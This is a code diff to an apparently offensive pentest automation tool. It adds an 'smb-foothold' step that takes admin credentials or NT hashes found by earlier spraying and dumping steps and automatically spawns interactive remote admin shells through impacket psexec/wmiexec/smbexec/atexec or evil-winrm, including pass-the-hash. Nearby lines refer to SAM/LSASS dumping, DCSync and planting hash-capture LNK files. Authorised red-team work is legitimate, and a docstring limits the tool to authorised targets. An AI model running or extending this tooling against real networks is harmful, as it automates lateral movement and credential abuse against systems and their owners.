@@ -2223,6 +2223,14 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"SMB readable shares: {len(files)} sensitive file(s)"[:140]}
         return None
 
+    # 2an) smb-foothold: an interactive admin session was spawned over valid creds / a hash
+    if sid == "smb-foothold":
+        m = re.search(r"^smb-foothold: (\S+ shell → .+)$", output, re.M)
+        if m:
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"foothold — {m.group(1)}"[:140]}
+        return None
+
     # 2am) smb-writable: hash-capture LNK planted on a writable share → coerces browsers
     if sid == "smb-writable":
         hits = re.findall(r"^✗ PLANT (.+)$", output, re.M)
@@ -2958,7 +2966,7 @@ _EXPLOIT_STEPS = {
         ("Dump SAM / LSA / LSASS; DCSync", "smb-dump"),
         ("Writable share → hash capture / payload", "smb-writable"),
         # ── land a shell & foothold ──
-        "Spawn & upgrade an interactive shell",
+        ("Spawn & upgrade an interactive shell", "smb-foothold"),
         # ── manual steps, tailored to what this host exposed ──
         "Manual steps & further research",
     ],
@@ -9671,6 +9679,101 @@ def _tool_smb_writable(ip: str, port: int, proto: str) -> str:
     return f"Writable-share hash capture — {ip}  (plants {_SMBWRITABLE_NAME}.lnk)\n\n" + "\n".join(lines)
 
 
+# ── SMB step 13: foothold — spawn an interactive admin session ─────────────────
+def _open_shell_terminal(cmd: str) -> "str | None":
+    """Open a shell command in a new terminal window/tab (for an interactive remote session).
+    Returns the emulator used, or None when headless so the caller can print the command."""
+    term = next(((shutil.which(x), flag) for x, flag in _TERM_EMULATORS if shutil.which(x)),
+                (None, None))
+    if not (os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY")) or not term[0]:
+        return None
+    binary, flag = term
+    inner = f"{cmd}; exec ${{SHELL:-/bin/bash}}"
+    try:
+        subprocess.Popen([binary] + flag + ["sh", "-c", inner],
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                         stdin=subprocess.DEVNULL, start_new_session=True)
+        return binary
+    except Exception:                                         # noqa: BLE001
+        return None
+
+
+def _smb_cred_domain(user: str, secret: str) -> str:
+    """Recover the AD domain for a cred from smb-creds (spray drops it in the admin note)."""
+    for row in fetch_hosts():
+        for sid, output in fetch_scripts(row[0], 445, "tcp"):
+            if sid != "smb-creds":
+                continue
+            for m in re.finditer(r"! (\S+?):(\S*) @ .+?\[([^\]]+)\]", output or ""):
+                if m.group(1).lower() == user.lower() and m.group(2) == secret:
+                    dom = m.group(3)
+                    if dom and not _looks_ip(dom):
+                        return dom
+    return ""
+
+
+def _smb_foothold_methods(host: str) -> list:
+    """Viable exec methods for a host, psexec first (per decision); evil-winrm only if WinRM
+    is open. Each entry is (method_name, binary)."""
+    order = []
+    for name, binexe in (("psexec", "impacket-psexec"), ("wmiexec", "impacket-wmiexec"),
+                         ("smbexec", "impacket-smbexec"), ("atexec", "impacket-atexec")):
+        if shutil.which(binexe):
+            order.append((name, binexe))
+    if any(p in (5985, 5986) for p, _pr, _st in fetch_ports(host)) and shutil.which("evil-winrm"):
+        order.append(("evil-winrm", "evil-winrm"))
+    return order
+
+
+def _smb_foothold_cmd(method: str, binexe: str, host: str, dom: str, user: str,
+                      secret: str, is_hash: bool) -> list:
+    """Build the interactive-session command for a method (pass-the-hash when secret is a hash)."""
+    if method == "evil-winrm":
+        return ["evil-winrm", "-i", host, "-u", user] + \
+            (["-H", secret] if is_hash else ["-p", secret])
+    prefix = f"{dom}/{user}" if dom else user
+    if is_hash:
+        return [binexe, f"{prefix}@{host}", "-hashes", f":{secret}"]
+    return [binexe, f"{prefix}:{secret}@{host}"]
+
+
+def _tool_smb_foothold(ip: str, port: int, proto: str) -> str:
+    """SMB step 13 tool (INTERACTIVE): auto-spawn an interactive admin session on the first
+    host smb-spray/smb-exec confirmed local admin — psexec preferred (full SYSTEM shell),
+    falling back to wmiexec / smbexec / atexec, or evil-winrm when WinRM is open. Pass-the-hash
+    when the cred is an NT hash. Opens the session in a new terminal window; headless, it prints
+    the exact command. Authorised targets only."""
+    admins = _gather_smb_admin()
+    if not admins:
+        print(f"\n{YELLOW}no confirmed admin creds{RESET} — run {BOLD}smb-spray (r9){RESET} / "
+              f"{BOLD}smb-exec (r10){RESET} first, then retry.")
+        return "smb-foothold: no admin creds (run smb-spray r9 / smb-exec r10)"
+    host, user, secret = admins[0]                # auto: first confirmed admin target
+    methods = _smb_foothold_methods(host)
+    if not methods:
+        print(f"\n{RED}✗ no exec tooling{RESET} — install impacket (psexec/wmiexec) or evil-winrm.")
+        return "smb-foothold: no exec tooling available"
+    is_hash = bool(re.fullmatch(r"[a-fA-F0-9]{32}", secret))
+    dom = _smb_cred_domain(user, secret)
+    method, binexe = methods[0]                    # auto: best (psexec-first)
+    cmd = _smb_foothold_cmd(method, binexe, host, dom, user, secret, is_hash)
+    cmd_str = shlex.join(cmd)
+    who = f"{dom}\\{user}" if dom else user
+
+    print(f"\n{GREEN}✓ admin target:{RESET} {who}@{host}  "
+          f"{DIM}· method {BOLD}{method}{RESET}{DIM}{' · pass-the-hash' if is_hash else ''}{RESET}")
+    if len(methods) > 1:
+        print(f"  {DIM}fallbacks: {', '.join(n for n, _b in methods[1:])}{RESET}")
+    term = _open_shell_terminal(cmd_str)
+    if term:
+        print(f"{GREEN}▶ spawned {method} in a new {term} window{RESET} {DIM}→ {who}@{host}{RESET}")
+        tail = ""
+    else:
+        print(f"{YELLOW}headless{RESET} — run this yourself:\n  {BOLD}{cmd_str}{RESET}")
+        tail = " (headless — command shown)"
+    return f"smb-foothold: {method} shell → {who}@{host}{tail}"
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
@@ -9712,6 +9815,7 @@ _STEP_TOOLS = {
     "smb-exec": ("Confirm command exec over admin creds (netexec -x → feeds foothold)", _tool_smb_exec),
     "smb-dump": ("Dump SAM/LSA/LSASS/DPAPI + DCSync NTDS (netexec, admin creds)", _tool_smb_dump),
     "smb-writable": ("Writable share → plant hash-capture LNK (netexec slinky, reversible)", _tool_smb_writable),
+    "smb-foothold": ("foothold → spawn interactive admin session (psexec/evil-winrm)", _tool_smb_foothold),
 }
 
 def _mins(seconds: int) -> str:
@@ -9768,6 +9872,7 @@ _STEP_TOOL_RUNS = {
     "smb-exec":         ("netexec -x", f"{_mins(_SMBEXEC_DEADLINE)} min"),
     "smb-dump":         ("netexec --sam/--lsa/--ntds", f"{_mins(_SMBDUMP_DEADLINE)} min"),
     "smb-writable":     ("netexec slinky", f"{_mins(_SMBWRITABLE_DEADLINE)} min"),
+    "smb-foothold":     ("impacket / evil-winrm", None),
 }
 
 
@@ -9846,7 +9951,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         return
     tlabel, runner = _STEP_TOOLS[tool_key]
 
-    if tool_key in ("foothold", "next-steps"):                # foreground: interactive / print-now
+    if tool_key in ("foothold", "next-steps", "smb-foothold"):  # foreground: interactive / print-now
         prev = fetch_step_status(ip, port, proto, key).get(n)
         set_step_status(ip, port, proto, key, n, "running")
         try:
